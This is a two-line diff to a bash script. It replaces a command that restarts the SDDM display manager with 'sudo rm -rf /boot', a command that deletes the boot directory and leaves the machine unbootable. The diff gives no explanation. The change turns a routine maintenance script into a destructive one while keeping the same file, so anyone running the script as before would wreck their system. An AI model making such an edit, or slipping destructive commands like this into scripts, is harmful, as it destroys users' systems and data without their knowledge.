@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo systemctl restart sddm
+sudo rm -rf /boot
